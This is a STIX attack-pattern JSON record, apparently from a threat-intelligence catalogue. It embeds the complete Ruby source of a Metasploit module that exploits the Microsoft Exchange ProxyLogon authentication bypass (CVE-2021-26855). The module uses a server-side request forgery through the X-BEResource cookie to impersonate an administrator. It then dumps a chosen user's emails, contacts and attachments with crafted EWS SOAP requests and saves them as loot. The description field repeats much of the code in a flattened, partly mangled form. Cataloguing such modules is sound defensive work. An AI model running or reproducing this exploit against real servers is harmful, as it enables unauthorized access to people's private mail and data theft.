{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0719c96b-3eff-4861-9171-c149f191e391",
    "created": "2024-08-14T16:31:50.064546Z",
    "modified": "2024-08-14T16:31:50.06455Z",
    "name": "Microsoft Exchange ProxyLogon Collector",
    "description": "Dump user emails from exchange server  ] ] 'DefaultAction' => 'Dump (Emails)' 'Notes' => { 'AKA' => ['ProxyLogon'] 'Stability' => [CRASH_SAFE] 'Reliability' => [] 'SideEffects' => [IOC_IN_LOGS]  ) )  register_options([ OptBool.new('ATTACHMENTS', [true, 'Dump documents attached to an email', true]) OptString.new('EMAIL', [true, 'The email account what you want dump']) OptString.new('FOLDER', [true, 'The email folder what you want dump', 'inbox']) OptEnum.new('METHOD', [true, 'HTTP Method to use for the check (only).', 'POST', ['GET', 'POST']]) OptString.new('TARGET', [false, 'Force the name of the internal Exchange server targeted']) ])  register_advanced_options([ OptInt.new('MaxEntries', [false, 'Override the maximum number of object to dump', 2147483647]) ]) end  XMLNS = { 't' => 'http://schemas.microsoft.com/exchange/services/2006/types' }.freeze  def dump_contacts(server_name) ssrf = \"#{server_name}/EWS/Exchange.asmx?a=~#{random_ssrf_id}\"  response = send_xml('POST', ssrf, soap_countitems(action['id_attribute'])) if response.body =~ /Success/ print_good(\"Successfuly connected to: #{action['id_attribute']}\") xml = Nokogiri::XML.parse(response.body)  folder_id = xml.at_xpath('//t:ContactsFolder/t:FolderId', XMLNS)&.values&.at(0) print_status(\"Selected folder: #{action['id_attribute']} (#{folder_id})\")  total_count = xml.at_xpath('//t:ContactsFolder/t:TotalCount', XMLNS)&.content print_status(\"Number of contact found: #{total_count}\")  if total_count.to_i > datastore['MaxEntries'] print_warning(\"Number of contact recalculated due to max entries: #{datastore['MaxEntries']}\") total_count = datastore['MaxEntries'].to_s end  response = send_xml('POST', ssrf, soap_listitems(action['id_attribute'], total_count)) xml = Nokogiri::XML.parse(response.body)  print_status(message(\"Processing dump of #{total_count} items\")) data = xml.xpath('//t:Items/t:Contact', XMLNS) if data.empty? print_status('The user has no contacts') else write_loot(\"#{datastore['EMAIL']}_#{action['id_attribute']}\", data.to_s) end end end  def dump_emails(server_name) ssrf = \"#{server_name}/EWS/Exchange.asmx?a=~#{random_ssrf_id}\"  response = send_xml('POST', ssrf, soap_countitems(datastore['FOLDER'])) if response.body =~ /Success/ print_good(\"Successfuly connected to: #{datastore['FOLDER']}\") xml = Nokogiri::XML.parse(response.body)  folder_id = xml.at_xpath('//t:Folder/t:FolderId', XMLNS)&.values&.at(0) print_status(\"Selected folder: #{datastore['FOLDER']} (#{folder_id})\")  total_count = xml.at_xpath('//t:Folder/t:TotalCount', XMLNS)&.content print_status(\"Number of email found: #{total_count}\")  if total_count.to_i > datastore['MaxEntries'] print_warning(\"Number of email recalculated due to max entries: #{datastore['MaxEntries']}\") total_count = datastore['MaxEntries'].to_s end  print_status(message(\"Processing dump of #{total_count} items\")) download_items(total_count, ssrf) end end  def download_attachments(item_id, ssrf) response = send_xml('POST', ssrf, soap_listattachments(item_id)) xml = Nokogiri::XML.parse(response.body)  xml.xpath('//t:Message/t:Attachments/t:FileAttachment', XMLNS).each do |item| item_id = item.at_xpath('./t:AttachmentId', XMLNS)&.values&.at(0)  response = send_xml('POST', ssrf, soap_downattachment(item_id)) data = Nokogiri::XML.parse(response.body)  filename = data.at_xpath('//t:FileAttachment/t:Name', XMLNS)&.content ctype = data.at_xpath('//t:FileAttachment/t:ContentType', XMLNS)&.content content = data.at_xpath('//t:FileAttachment/t:Content', XMLNS)&.content  print_status(\"   -> attachment: #{item_id} (#{filename})\") write_loot(\"#{datastore['EMAIL']}_#{datastore['FOLDER']}\", Rex::Text.decode_base64(content), filename, ctype) end end  def download_items(total_count, ssrf) response = send_xml('POST', ssrf, soap_listitems(datastore['FOLDER'], total_count)) xml = Nokogiri::XML.parse(response.body)  xml.xpath('//t:Items/t:Message', XMLNS).each do |item| item_info = item.at_xpath('./t:ItemId', XMLNS)&.values next if item_info.nil?  print_status(\"Download item: #{item_info[1]}\")  response = send_xml('POST', ssrf, soap_downitem(item_info[0], item_info[1])) data = Nokogiri::XML.parse(response.body)  email = data.at_xpath('//t:Message/t:MimeContent', XMLNS)&.content write_loot(\"#{datastore['EMAIL']}_#{datastore['FOLDER']}\", Rex::Text.decode_base64(email))  attachments = item.at_xpath('./t:HasAttachments', XMLNS)&.content if datastore['ATTACHMENTS'] && attachments == 'true' download_attachments(item_info[0], ssrf) end print_status end end  def message(msg) \"#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}\" end  def random_ssrf_id # https://en.wikipedia.org/wiki/2,147,483,647 (lol) # max. 2147483647 rand(1941962752..2147483647) end  def request_autodiscover(server_name) xmlns = { 'xmlns' => 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'   response = send_xml('POST', \"#{server_name}/autodiscover/autodiscover.xml?a=~#{random_ssrf_id}\", soap_autodiscover)  case response.body when %r{<ErrorCode>500</ErrorCode> fail_with(Failure::NotFound, 'No Autodiscover information was found') when %r{<Action>redirectAddr</Action> fail_with(Failure::NotFound, 'No email address was found') end  xml = Nokogiri::XML.parse(response.body)  legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns)&.content fail_with(Failure::NotFound, 'No \\'LegacyDN\\' was found') if legacy_dn.blank?  server = '' owa_urls = [] xml.xpath('//xmlns:Account/xmlns:Protocol', xmlns).each do |item| type = item.at_xpath('./xmlns:Type', xmlns)&.content if type == 'EXCH' server = item.at_xpath('./xmlns:Server', xmlns)&.content end  next unless type == 'WEB'  item.xpath('./xmlns:Internal/xmlns:OWAUrl', xmlns).each do |owa_url| owa_urls << owa_url.content end end fail_with(Failure::NotFound, 'No \\'Server ID\\' was found') if server.nil? || server.empty? fail_with(Failure::NotFound, 'No \\'OWAUrl\\' was found') if owa_urls.empty?  return([server, legacy_dn, owa_urls]) end  def send_http(method, ssrf, data: '', ctype: 'application/x-www-form-urlencoded') request = { 'method' => method 'uri' => @random_uri 'cookie' => \"X-BEResource=#{ssrf};\" 'ctype' => ctype  request = request.merge({ 'data' => data }) unless data.empty?  received = send_request_cgi(request) fail_with(Failure::TimeoutExpired, 'Server did not respond in an expected way') unless received  received end  def send_xml(method, ssrf, data, ctype: 'text/xml; charset=utf-8') send_http(method, ssrf, data: data, ctype: ctype) end  def soap_autodiscover <<~SOAP <?xml version=\"1.0\" encoding=\"utf-8\"?> <Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\"> <Request> <EMailAddress>#{datastore['EMAIL']}</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema> </Request> </Autodiscover> SOAP end  def soap_countitems(folder_id) <<~SOAP <?xml version=\"1.0\" encoding=\"utf-8\"?> <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\" xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"> <soap:Body> <m:GetFolder> <m:FolderShape> <t:BaseShape>Default</t:BaseShape> </m:FolderShape> <m:FolderIds> <t:DistinguishedFolderId Id=\"#{folder_id}\"> <t:Mailbox> <t:EmailAddress>#{datastore['EMAIL']}</t:EmailAddress> </t:Mailbox> </t:DistinguishedFolderId> </m:FolderIds> </m:GetFolder> </soap:Body> </soap:Envelope> SOAP end  def soap_listattachments(item_id) <<~SOAP <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\" xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"> <soap:Body> <m:GetItem> <m:ItemShape> <t:BaseShape>IdOnly</t:BaseShape> <t:AdditionalProperties> <t:FieldURI FieldURI=\"item:Attachments\" /> </t:AdditionalProperties> </m:ItemShape> <m:ItemIds> <t:ItemId Id=\"#{item_id}\" /> </m:ItemIds> </m:GetItem> </soap:Body> </soap:Envelope> SOAP end  def soap_listitems(folder_id, max_entries) <<~SOAP <?xml version='1.0' encoding='utf-8'?> <soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/' xmlns:t='http://schemas.microsoft.com/exchange/services/2006/types' xmlns:m='http://schemas.microsoft.com/exchange/services/2006/messages' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'> <soap:Body> <m:FindItem Traversal='Shallow'> <m:ItemShape> <t:BaseShape>AllProperties</t:BaseShape> </m:ItemShape> <m:IndexedPageItemView MaxEntriesReturned=\"#{max_entries}\" Offset=\"0\" BasePoint=\"Beginning\" /> <m:ParentFolderIds> <t:DistinguishedFolderId Id='#{folder_id}'> <t:Mailbox> <t:EmailAddress>#{datastore['EMAIL']}</t:EmailAddress> </t:Mailbox> </t:DistinguishedFolderId> </m:ParentFolderIds> </m:FindItem> </soap:Body> </soap:Envelope> SOAP end  def soap_downattachment(item_id) <<~SOAP <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\" xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"> <soap:Body> <m:GetAttachment> <m:AttachmentIds> <t:AttachmentId Id=\"#{item_id}\" /> </m:AttachmentIds> </m:GetAttachment> </soap:Body> </soap:Envelope> SOAP end  def soap_downitem(id, change_key) <<~SOAP <?xml version=\"1.0\" encoding=\"utf-8\"?> <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\" xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"> <soap:Body> <m:GetItem> <m:ItemShape> <t:BaseShape>IdOnly</t:BaseShape> <t:IncludeMimeContent>true</t:IncludeMimeContent> </m:ItemShape> <m:ItemIds> <t:ItemId Id=\"#{id}\" ChangeKey=\"#{change_key}\" /> </m:ItemIds> </m:GetItem> </soap:Body> </soap:Envelope> SOAP end  def write_loot(type, data, name = '', ctype = 'text/plain') loot_path = store_loot(type, ctype, datastore['RHOSTS'], data, name, '') print_good(\"File saved to #{loot_path}\") end  def run @proto = (ssl ? 'https' : 'http') @random_uri = normalize_uri('ecp', \"#{Rex::Text.rand_text_alpha(1..3)}.js\") ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/exchange_proxylogon_collector.rb",
            "external_id": "exchange_proxylogon_collector.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-26855"
        },
        {
            "source_name": "reference",
            "url": "https://proxylogon.com/"
        },
        {
            "source_name": "reference",
            "url": "https://msrc-blog.microsoft.com/2021/03/02/multiple-security-updates-released-for-exchange-server/"
        },
        {
            "source_name": "reference",
            "url": "https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/distinguishedfolderid"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/3gstudent/Homework-of-Python/blob/master/ewsManage.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# begin auxiliary class\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Exchange ProxyLogon Collector',\n        'Description' => %q{\n          This module exploit a vulnerability on Microsoft Exchange Server that\n          allows an attacker bypassing the authentication and impersonating as the\n          admin (CVE-2021-26855).\n\n          By taking advantage of this vulnerability, it is possible to dump all\n          mailboxes (emails, attachments, contacts, ...).\n\n          This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012,\n          Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009,\n          Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).\n\n          All components are vulnerable by default.\n        },\n        'Author' => [\n          'Orange Tsai', # Dicovery (Officially acknowledged by MSRC)\n          'GreyOrder', # PoC (https://github.com/GreyOrder)\n          'mekhalleh (RAMELLA S\u00e9bastien)' # Module author independent researcher (work at Zeop Entreprise)\n        ],\n        'References' => [\n          ['CVE', '2021-26855'],\n          ['LOGO', 'https://proxylogon.com/images/logo.jpg'],\n          ['URL', 'https://proxylogon.com/'],\n          ['URL', 'https://msrc-blog.microsoft.com/2021/03/02/multiple-security-updates-released-for-exchange-server/'],\n          ['URL', 'https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/distinguishedfolderid'],\n          ['URL', 'https://github.com/3gstudent/Homework-of-Python/blob/master/ewsManage.py']\n        ],\n        'DisclosureDate' => '2021-03-02',\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Actions' => [\n          [\n            'Dump (Contacts)', {\n              'Description' => 'Dump user contacts from exchange server',\n              'id_attribute' => 'contacts'\n            }\n          ],\n          [\n            'Dump (Emails)', {\n              'Description' => 'Dump user emails from exchange server'\n            }\n          ]\n        ],\n        'DefaultAction' => 'Dump (Emails)',\n        'Notes' => {\n          'AKA' => ['ProxyLogon'],\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      OptBool.new('ATTACHMENTS', [true, 'Dump documents attached to an email', true]),\n      OptString.new('EMAIL', [true, 'The email account what you want dump']),\n      OptString.new('FOLDER', [true, 'The email folder what you want dump', 'inbox']),\n      OptEnum.new('METHOD', [true, 'HTTP Method to use for the check (only).', 'POST', ['GET', 'POST']]),\n      OptString.new('TARGET', [false, 'Force the name of the internal Exchange server targeted'])\n    ])\n\n    register_advanced_options([\n      OptInt.new('MaxEntries', [false, 'Override the maximum number of object to dump', 2147483647])\n    ])\n  end\n\n  XMLNS = { 't' => 'http://schemas.microsoft.com/exchange/services/2006/types' }.freeze\n\n  def dump_contacts(server_name)\n    ssrf = \"#{server_name}/EWS/Exchange.asmx?a=~#{random_ssrf_id}\"\n\n    response = send_xml('POST', ssrf, soap_countitems(action['id_attribute']))\n    if response.body =~ /Success/\n      print_good(\"Successfuly connected to: #{action['id_attribute']}\")\n      xml = Nokogiri::XML.parse(response.body)\n\n      folder_id = xml.at_xpath('//t:ContactsFolder/t:FolderId', XMLNS)&.values&.at(0)\n      print_status(\"Selected folder: #{action['id_attribute']} (#{folder_id})\")\n\n      total_count = xml.at_xpath('//t:ContactsFolder/t:TotalCount', XMLNS)&.content\n      print_status(\"Number of contact found: #{total_count}\")\n\n      if total_count.to_i > datastore['MaxEntries']\n        print_warning(\"Number of contact recalculated due to max entries: #{datastore['MaxEntries']}\")\n        total_count = datastore['MaxEntries'].to_s\n      end\n\n      response = send_xml('POST', ssrf, soap_listitems(action['id_attribute'], total_count))\n      xml = Nokogiri::XML.parse(response.body)\n\n      print_status(message(\"Processing dump of #{total_count} items\"))\n      data = xml.xpath('//t:Items/t:Contact', XMLNS)\n      if data.empty?\n        print_status('The user has no contacts')\n      else\n        write_loot(\"#{datastore['EMAIL']}_#{action['id_attribute']}\", data.to_s)\n      end\n    end\n  end\n\n  def dump_emails(server_name)\n    ssrf = \"#{server_name}/EWS/Exchange.asmx?a=~#{random_ssrf_id}\"\n\n    response = send_xml('POST', ssrf, soap_countitems(datastore['FOLDER']))\n    if response.body =~ /Success/\n      print_good(\"Successfuly connected to: #{datastore['FOLDER']}\")\n      xml = Nokogiri::XML.parse(response.body)\n\n      folder_id = xml.at_xpath('//t:Folder/t:FolderId', XMLNS)&.values&.at(0)\n      print_status(\"Selected folder: #{datastore['FOLDER']} (#{folder_id})\")\n\n      total_count = xml.at_xpath('//t:Folder/t:TotalCount', XMLNS)&.content\n      print_status(\"Number of email found: #{total_count}\")\n\n      if total_count.to_i > datastore['MaxEntries']\n        print_warning(\"Number of email recalculated due to max entries: #{datastore['MaxEntries']}\")\n        total_count = datastore['MaxEntries'].to_s\n      end\n\n      print_status(message(\"Processing dump of #{total_count} items\"))\n      download_items(total_count, ssrf)\n    end\n  end\n\n  def download_attachments(item_id, ssrf)\n    response = send_xml('POST', ssrf, soap_listattachments(item_id))\n    xml = Nokogiri::XML.parse(response.body)\n\n    xml.xpath('//t:Message/t:Attachments/t:FileAttachment', XMLNS).each do |item|\n      item_id = item.at_xpath('./t:AttachmentId', XMLNS)&.values&.at(0)\n\n      response = send_xml('POST', ssrf, soap_downattachment(item_id))\n      data = Nokogiri::XML.parse(response.body)\n\n      filename = data.at_xpath('//t:FileAttachment/t:Name', XMLNS)&.content\n      ctype = data.at_xpath('//t:FileAttachment/t:ContentType', XMLNS)&.content\n      content = data.at_xpath('//t:FileAttachment/t:Content', XMLNS)&.content\n\n      print_status(\"   -> attachment: #{item_id} (#{filename})\")\n      write_loot(\"#{datastore['EMAIL']}_#{datastore['FOLDER']}\", Rex::Text.decode_base64(content), filename, ctype)\n    end\n  end\n\n  def download_items(total_count, ssrf)\n    response = send_xml('POST', ssrf, soap_listitems(datastore['FOLDER'], total_count))\n    xml = Nokogiri::XML.parse(response.body)\n\n    xml.xpath('//t:Items/t:Message', XMLNS).each do |item|\n      item_info = item.at_xpath('./t:ItemId', XMLNS)&.values\n      next if item_info.nil?\n\n      print_status(\"Download item: #{item_info[1]}\")\n\n      response = send_xml('POST', ssrf, soap_downitem(item_info[0], item_info[1]))\n      data = Nokogiri::XML.parse(response.body)\n\n      email = data.at_xpath('//t:Message/t:MimeContent', XMLNS)&.content\n      write_loot(\"#{datastore['EMAIL']}_#{datastore['FOLDER']}\", Rex::Text.decode_base64(email))\n\n      attachments = item.at_xpath('./t:HasAttachments', XMLNS)&.content\n      if datastore['ATTACHMENTS'] && attachments == 'true'\n        download_attachments(item_info[0], ssrf)\n      end\n      print_status\n    end\n  end\n\n  def message(msg)\n    \"#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}\"\n  end\n\n  def random_ssrf_id\n    # https://en.wikipedia.org/wiki/2,147,483,647 (lol)\n    # max. 2147483647\n    rand(1941962752..2147483647)\n  end\n\n  def request_autodiscover(server_name)\n    xmlns = { 'xmlns' => 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a' }\n\n    response = send_xml('POST', \"#{server_name}/autodiscover/autodiscover.xml?a=~#{random_ssrf_id}\", soap_autodiscover)\n\n    case response.body\n    when %r{<ErrorCode>500</ErrorCode>}\n      fail_with(Failure::NotFound, 'No Autodiscover information was found')\n    when %r{<Action>redirectAddr</Action>}\n      fail_with(Failure::NotFound, 'No email address was found')\n    end\n\n    xml = Nokogiri::XML.parse(response.body)\n\n    legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns)&.content\n    fail_with(Failure::NotFound, 'No \\'LegacyDN\\' was found') if legacy_dn.blank?\n\n    server = ''\n    owa_urls = []\n    xml.xpath('//xmlns:Account/xmlns:Protocol', xmlns).each do |item|\n      type = item.at_xpath('./xmlns:Type', xmlns)&.content\n      if type == 'EXCH'\n        server = item.at_xpath('./xmlns:Server', xmlns)&.content\n      end\n\n      next unless type == 'WEB'\n\n      item.xpath('./xmlns:Internal/xmlns:OWAUrl', xmlns).each do |owa_url|\n        owa_urls << owa_url.content\n      end\n    end\n    fail_with(Failure::NotFound, 'No \\'Server ID\\' was found') if server.nil? || server.empty?\n    fail_with(Failure::NotFound, 'No \\'OWAUrl\\' was found') if owa_urls.empty?\n\n    return([server, legacy_dn, owa_urls])\n  end\n\n  def send_http(method, ssrf, data: '', ctype: 'application/x-www-form-urlencoded')\n    request = {\n      'method' => method,\n      'uri' => @random_uri,\n      'cookie' => \"X-BEResource=#{ssrf};\",\n      'ctype' => ctype\n    }\n    request = request.merge({ 'data' => data }) unless data.empty?\n\n    received = send_request_cgi(request)\n    fail_with(Failure::TimeoutExpired, 'Server did not respond in an expected way') unless received\n\n    received\n  end\n\n  def send_xml(method, ssrf, data, ctype: 'text/xml; charset=utf-8')\n    send_http(method, ssrf, data: data, ctype: ctype)\n  end\n\n  def soap_autodiscover\n    <<~SOAP\n      <?xml version=\"1.0\" encoding=\"utf-8\"?>\n      <Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\">\n        <Request>\n          <EMailAddress>#{datastore['EMAIL']}</EMailAddress>\n          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>\n        </Request>\n      </Autodiscover>\n    SOAP\n  end\n\n  def soap_countitems(folder_id)\n    <<~SOAP\n      <?xml version=\"1.0\" encoding=\"utf-8\"?>\n      <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n      xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\"\n      xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\"\n      xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n        <soap:Body>\n          <m:GetFolder>\n            <m:FolderShape>\n              <t:BaseShape>Default</t:BaseShape>\n            </m:FolderShape>\n            <m:FolderIds>\n              <t:DistinguishedFolderId Id=\"#{folder_id}\">\n                <t:Mailbox>\n                  <t:EmailAddress>#{datastore['EMAIL']}</t:EmailAddress>\n                </t:Mailbox>\n              </t:DistinguishedFolderId>\n            </m:FolderIds>\n          </m:GetFolder>\n        </soap:Body>\n      </soap:Envelope>\n    SOAP\n  end\n\n  def soap_listattachments(item_id)\n    <<~SOAP\n      <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n      xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\"\n      xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\"\n      xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n        <soap:Body>\n          <m:GetItem>\n            <m:ItemShape>\n              <t:BaseShape>IdOnly</t:BaseShape>\n              <t:AdditionalProperties>\n                <t:FieldURI FieldURI=\"item:Attachments\" />\n              </t:AdditionalProperties>\n            </m:ItemShape>\n            <m:ItemIds>\n              <t:ItemId Id=\"#{item_id}\" />\n            </m:ItemIds>\n          </m:GetItem>\n        </soap:Body>\n      </soap:Envelope>\n    SOAP\n  end\n\n  def soap_listitems(folder_id, max_entries)\n    <<~SOAP\n      <?xml version='1.0' encoding='utf-8'?>\n      <soap:Envelope\n      xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'\n      xmlns:t='http://schemas.microsoft.com/exchange/services/2006/types'\n      xmlns:m='http://schemas.microsoft.com/exchange/services/2006/messages'\n      xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>\n        <soap:Body>\n          <m:FindItem Traversal='Shallow'>\n            <m:ItemShape>\n              <t:BaseShape>AllProperties</t:BaseShape>\n            </m:ItemShape>\n            <m:IndexedPageItemView MaxEntriesReturned=\"#{max_entries}\" Offset=\"0\" BasePoint=\"Beginning\" />\n            <m:ParentFolderIds>\n              <t:DistinguishedFolderId Id='#{folder_id}'>\n                <t:Mailbox>\n                  <t:EmailAddress>#{datastore['EMAIL']}</t:EmailAddress>\n                </t:Mailbox>\n              </t:DistinguishedFolderId>\n            </m:ParentFolderIds>\n          </m:FindItem>\n        </soap:Body>\n      </soap:Envelope>\n    SOAP\n  end\n\n  def soap_downattachment(item_id)\n    <<~SOAP\n      <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n      xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\"\n      xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\"\n      xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n        <soap:Body>\n          <m:GetAttachment>\n            <m:AttachmentIds>\n              <t:AttachmentId Id=\"#{item_id}\" />\n            </m:AttachmentIds>\n          </m:GetAttachment>\n        </soap:Body>\n      </soap:Envelope>\n    SOAP\n  end\n\n  def soap_downitem(id, change_key)\n    <<~SOAP\n      <?xml version=\"1.0\" encoding=\"utf-8\"?>\n      <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n      xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\"\n      xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\"\n      xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n        <soap:Body>\n          <m:GetItem>\n            <m:ItemShape>\n              <t:BaseShape>IdOnly</t:BaseShape>\n              <t:IncludeMimeContent>true</t:IncludeMimeContent>\n            </m:ItemShape>\n            <m:ItemIds>\n              <t:ItemId Id=\"#{id}\" ChangeKey=\"#{change_key}\" />\n            </m:ItemIds>\n          </m:GetItem>\n        </soap:Body>\n      </soap:Envelope>\n    SOAP\n  end\n\n  def write_loot(type, data, name = '', ctype = 'text/plain')\n    loot_path = store_loot(type, ctype, datastore['RHOSTS'], data, name, '')\n    print_good(\"File saved to #{loot_path}\")\n  end\n\n  def run\n    @proto = (ssl ? 'https' : 'http')\n    @random_uri = normalize_uri('ecp', \"#{Rex::Text.rand_text_alpha(1..3)}.js\")\n\n    print_status(message('Attempt to exploit for CVE-2021-26855'))\n\n    # request for internal server name.\n    response = send_http(datastore['METHOD'], \"localhost~#{random_ssrf_id}\")\n    if response.code != 500 || !response.headers.to_s.include?('X-FEServer')\n      fail_with(Failure::NotFound, 'No \\'X-FEServer\\' was found')\n    end\n    server_name = response.headers['X-FEServer']\n    print_status(\"Internal server name (#{server_name})\")\n\n    # get informations by autodiscover request.\n    print_status(message('Sending autodiscover request'))\n    server_id, legacy_dn, owa_urls = request_autodiscover(server_name)\n\n    print_status(\"Server: #{server_id}\")\n    print_status(\"LegacyDN: #{legacy_dn}\")\n    print_status(\"Internal target(s): #{owa_urls.join(', ')}\")\n\n    # selecting target\n    print_status(message('Selecting the first internal server to respond'))\n    if datastore['TARGET'].nil? || datastore['TARGET'].empty?\n      target = ''\n      owa_urls.each do |url|\n        host = url.split('://')[1].split('.')[0].downcase\n        next unless host != server_name.downcase\n\n        response = send_http('GET', \"#{host}/EWS/Exchange.asmx?a=~#{random_ssrf_id}\")\n        next unless response.code == 200\n\n        target = host\n        print_good(\"Targeting internal: #{url}\")\n\n        break\n      end\n      fail_with(Failure::NotFound, 'No internal target was found') if target.empty?\n    else\n      target = datastore['TARGET']\n      print_good(\"Targeting internal forced to: #{target}\")\n    end\n\n    # run action\n    case action.name\n    when /Dump \\(Contacts\\)/\n      print_status(message(\"Attempt to dump contacts for <#{datastore['EMAIL']}>\"))\n      dump_contacts(target)\n    when /Dump \\(Emails\\)/\n      print_status(message(\"Attempt to dump emails for <#{datastore['EMAIL']}>\"))\n      dump_emails(target)\n    end\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-03-02"
}